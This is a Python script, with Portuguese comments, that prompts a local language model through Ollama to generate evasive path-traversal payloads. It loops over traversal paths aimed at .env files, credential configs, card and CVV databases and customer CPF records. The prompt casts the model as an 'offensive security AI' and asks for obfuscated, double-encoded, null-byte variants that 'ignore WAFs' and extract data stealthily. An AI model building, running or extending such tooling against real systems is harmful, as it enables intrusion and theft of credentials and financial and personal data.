import os
from datetime import datetime
import requests
from tqdm import tqdm  # Barra de progresso interativa
import logging  # Para logs detalhados

# Configuração dos logs
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Fallback para o Ollama
usar_ollama = False

# Testando a conexão com o modelo local via Ollama
logging.info("⚠️ Tentando usar modelo local via Ollama...")
try:
    r = requests.get("http://localhost:11434/api/tags", timeout=3)
    if r.status_code == 200:
        usar_ollama = True
        logging.info("✅ Modelo local via Ollama disponível.")
    else:
        raise RuntimeError("Resposta inesperada do servidor Ollama.")
except Exception as e:
    logging.error("🚫 Nenhum modelo pôde ser carregado com sucesso, nem mesmo o local.")
    raise RuntimeError("🚫 Nenhum modelo pôde ser carregado com sucesso, nem mesmo o local.") from e

# Alvos reais simulados
alvos_reais = [
    "../../var/data/cartoes_full_dump.csv",
    "../../etc/billing/clientes_cpf.txt",
    "../../var/www/html/storage/cvv.db",
    "../../mnt/db/transacoes_fraudes.sqlite",
    "../../var/clients/full_users.sql",
    "../../home/admin/configs/usuarios_cadastrados.csv",
    "../../var/log/apache2/access.log",
    "../../var/log/nginx/error.log",
    "../../tmp/debug_info/dev_trace.txt",
    "../../etc/nginx/sites-available/default",
    "../../var/www/html/.env",
    "../../app/config/credentials.json",
    "../../var/www/html/config/database.php",
    "../../backups/dump_2024.zip",
    "../../var/private/backup_config_antigo.tar.gz"
]

# Diretório de saída
OUTPUT_DIR = "payloads"
os.makedirs(OUTPUT_DIR, exist_ok=True)
data_hora = datetime.now().strftime("%Y%m%d_%H%M%S")
output_file = os.path.join(OUTPUT_DIR, f"payloads_gerados_{data_hora}.txt")

def gerar_payloads(payload_base, n_variantes=5):
    prompt = (
        f"Você é uma IA ofensiva de segurança. Gera {n_variantes} variantes brutais e furtivas para o payload:\n"
        f"{payload_base}\n"
        "Use evasões como obfuscation, double-encoding, null byte, concatenação, truncamento e traversal.\n"
        "Ignore WAFs. Objetivo: extrair dados de forma real e furtiva.\n"
    )

    # Barra de progresso para cada geração de payload
    logging.info(f"🔧 Gerando payloads para o alvo: {payload_base}")
    
    if usar_ollama:
        try:
            response = requests.post(
                "http://localhost:11434/api/generate",
                json={
                    "model": "tinyllama:latest",  # Usando o modelo local "tinyllama:latest"
                    "prompt": prompt,
                    "stream": False
                }
            )
            resposta = response.json()
            texto_gerado = resposta.get("response", "")
            logging.info(f"✅ Payloads gerados para: {payload_base}")
        except Exception as e:
            logging.error(f"🚫 Erro ao gerar payload para {payload_base}: {e}")
            texto_gerado = "Erro: Nenhum modelo foi carregado."
    else:
        texto_gerado = "Erro: Nenhum modelo foi carregado."

    # Salva o payload gerado no arquivo de saída
    with open(output_file, "a", encoding="utf-8") as f:
        f.write(f"\n--- PAYLOAD BASE: {payload_base} ---\n")
        f.write(texto_gerado)
        f.write("\n\n")

    return texto_gerado

# Função principal
if __name__ == "__main__":
    logging.info("📂 Iniciando geração para múltiplos arquivos vulneráveis...\n")
    
    # Barra de progresso para os alvos
    with tqdm(total=len(alvos_reais), desc="Gerando payloads para alvos", ncols=100, colour="green") as pbar:
        for alvo in alvos_reais:
            gerar_payloads(alvo)
            pbar.update(1)  # Atualiza a barra de progresso

    logging.info(f"\n✅ Todos os payloads foram salvos em: {output_file}")
    print("🎯 Operação concluída com sucesso.")
